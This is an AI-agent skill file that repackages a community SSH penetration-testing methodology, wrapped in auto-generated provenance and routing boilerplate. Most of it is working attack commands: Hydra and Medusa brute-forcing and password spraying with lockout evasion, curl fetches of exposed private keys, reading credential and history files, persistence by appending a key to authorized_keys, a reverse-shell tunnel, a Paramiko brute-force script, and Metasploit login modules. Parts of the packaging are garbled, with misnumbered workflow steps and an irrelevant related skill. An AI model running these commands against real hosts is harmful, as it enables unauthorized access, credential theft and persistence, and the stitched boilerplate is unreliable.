---
name: ssh-penetration-testing
description: "SSH Penetration Testing workflow skill. Use this skill when the user needs Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["ssh-penetration-testing", "conduct", "comprehensive", "ssh", "security", "assessments", "including", "enumeration"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-18"
---

# SSH Penetration Testing

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/ssh-penetration-testing` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `EXTERNAL_SOURCE.json` plus `ORIGIN.md` as the provenance anchor for review.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # SSH Penetration Testing

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Prerequisites, Outputs and Deliverables, Constraints and Limitations.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology....
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `EXTERNAL_SOURCE.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `SKILL.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `SKILL.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. Weak key exchange algorithms (diffie-hellman-group1-sha1)
2. Weak ciphers (arcfour, 3des-cbc)
3. Weak MACs (hmac-md5, hmac-sha1-96)
4. Deprecated protocol versions
5. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.
6. Read the overview and provenance files before loading any copied upstream support files.
7. Load only the references, examples, prompts, or scripts that materially change the outcome for the current request.

### Imported Workflow Notes

#### Imported: Core Workflow

### Phase 1: SSH Service Discovery

Identify SSH services on target networks:

```bash
# Quick SSH port scan
nmap -p 22 192.168.1.0/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 192.168.1.100

# Full port scan for SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Service version detection
nmap -sV -p 22 192.168.1.100
```

### Phase 2: SSH Enumeration

Gather detailed information about SSH services:

```bash
# Banner grabbing
nc 192.168.1.100 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet 192.168.1.100 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Phase 3: SSH Configuration Auditing

Identify weak configurations:

```bash
# ssh-audit - comprehensive SSH audit
ssh-audit 192.168.1.100

# ssh-audit with specific port
ssh-audit -p 2222 192.168.1.100

# Output includes:
# - Algorithm recommendations
# - Security vulnerabilities
# - Hardening suggestions
```

Key configuration weaknesses to identify:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Deprecated protocol versions

### Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### Phase 5: Key-Based Authentication Testing

Test for weak or exposed keys:

```bash
# Attempt login with found private key
ssh -i id_rsa user@192.168.1.100

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# Force password authentication
ssh -o PreferredAuthentications=password user@192.168.1.100

# Try common key names
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

Check for exposed keys:

```bash
# Common locations for private keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Web-accessible keys (check with curl/wget)
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```

### Phase 6: Vulnerability Exploitation

Search for known vulnerabilities:

```bash
# Search for exploits
searchsploit openssh
searchsploit openssh 7.2

# Common SSH vulnerabilities
# CVE-2018-15473 - Username enumeration
# CVE-2016-0777 - Roaming vulnerability
# CVE-2016-0778 - Buffer overflow

# Metasploit enumeration
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

# Username enumeration (CVE-2018-15473)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/users.txt
run
```

### Phase 7: SSH Tunneling and Port Forwarding

#### Local Port Forwarding

Forward local port to remote service:

```bash
# Syntax: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server

# Access internal web server through SSH
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
# Now access http://localhost:8080

# Access internal database
ssh -L 3306:192.168.1.50:3306 user@192.168.1.100

# Multiple forwards
ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
```

#### Remote Port Forwarding

Expose local service to remote network:

```bash
# Syntax: ssh -R <remote_port>:<local_host>:<local_port> user@ssh_server

# Expose local web server to remote
ssh -R 8080:localhost:80 user@192.168.1.100
# Remote can access via localhost:8080

# Reverse shell callback
ssh -R 4444:localhost:4444 user@192.168.1.100
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create SOCKS proxy for network pivoting:

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@192.168.1.100

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Browser configuration
# Set SOCKS proxy to localhost:1080
```

#### ProxyJump (Jump Hosts)

Chain through multiple SSH servers:

```bash
# Jump through intermediate host
ssh -J user1@jump_host user2@target_host

# Multiple jumps
ssh -J user1@jump1,user2@jump2 user3@target

# With SSH config
# ~/.ssh/config
Host target
    HostName 192.168.2.50
    User admin
    ProxyJump user@192.168.1.100
```

### Phase 8: Post-Exploitation

Activities after gaining SSH access:

```bash
# Check sudo privileges
sudo -l

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check SSH directory
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# Add persistence (add your key)
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Extract SSH configuration
cat /etc/ssh/sshd_config

# Find other users
cat /etc/passwd | grep -v nologin
ls /home/

# History for credentials
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

### Phase 9: Custom SSH Scripts with Paramiko

Python-based SSH automation:

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """Attempt SSH connection with credentials"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Success: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def execute_command(client, command):
    """Execute command via SSH"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """Brute-force SSH with wordlist"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # Run post-exploitation commands
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"
    
    # Single credential test
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```

### Phase 10: Metasploit SSH Modules

Use Metasploit for comprehensive SSH testing:

```bash
# Start Metasploit
msfconsole

# SSH Version Scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH Login Brute-Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# SSH Key Login
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# Username Enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# Post-exploitation with SSH session
sessions -i 1
```

#### Imported: Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @ssh-penetration-testing to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @ssh-penetration-testing against EXTERNAL_SOURCE.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @ssh-penetration-testing for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @ssh-penetration-testing using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.



## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Point directly at the copied upstream files that justify the workflow instead of relying on generic review boilerplate.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/ssh-penetration-testing`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `EXTERNAL_SOURCE.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
| Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |

## Related Skills

- `@server-management` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@service-mesh-expert` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@service-mesh-observability` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@sexual-health-analyzer` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/n/a` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |



### Imported Reference Notes

#### Imported: Quick Reference

### SSH Enumeration Commands

| Command | Purpose |
|---------|---------|
| `nc <host> 22` | Banner grabbing |
| `ssh-audit <host>` | Configuration audit |
| `nmap --script ssh*` | SSH NSE scripts |
| `searchsploit openssh` | Find exploits |

### Brute-Force Options

| Tool | Command |
|------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

### Port Forwarding Types

| Type | Command | Use Case |
|------|---------|----------|
| Local | `-L 8080:target:80` | Access remote services locally |
| Remote | `-R 8080:localhost:80` | Expose local services remotely |
| Dynamic | `-D 1080` | SOCKS proxy for pivoting |

### Common SSH Ports

| Port | Description |
|------|-------------|
| 22 | Default SSH |
| 2222 | Common alternate |
| 22222 | Another alternate |
| 830 | NETCONF over SSH |

#### Imported: Prerequisites

### Required Tools
- Nmap with SSH scripts
- Hydra or Medusa for brute-forcing
- ssh-audit for configuration analysis
- Metasploit Framework
- Python with Paramiko library

### Required Knowledge
- SSH protocol fundamentals
- Public/private key authentication
- Port forwarding concepts
- Linux command-line proficiency

#### Imported: Outputs and Deliverables

1. **SSH Enumeration Report** - Versions, algorithms, configurations
2. **Credential Assessment** - Weak passwords, default credentials
3. **Vulnerability Assessment** - Known CVEs, misconfigurations
4. **Tunnel Documentation** - Port forwarding configurations

#### Imported: Constraints and Limitations

### Legal Considerations
- Always obtain written authorization
- Brute-forcing may violate ToS
- Document all testing activities

### Technical Limitations
- Rate limiting may block attacks
- Fail2ban or similar may ban IPs
- Key-based auth prevents password attacks
- Two-factor authentication adds complexity

### Evasion Techniques
- Use slow brute-force: `-t 1 -w 5`
- Distribute attacks across IPs
- Use timing-based enumeration carefully
- Respect lockout thresholds
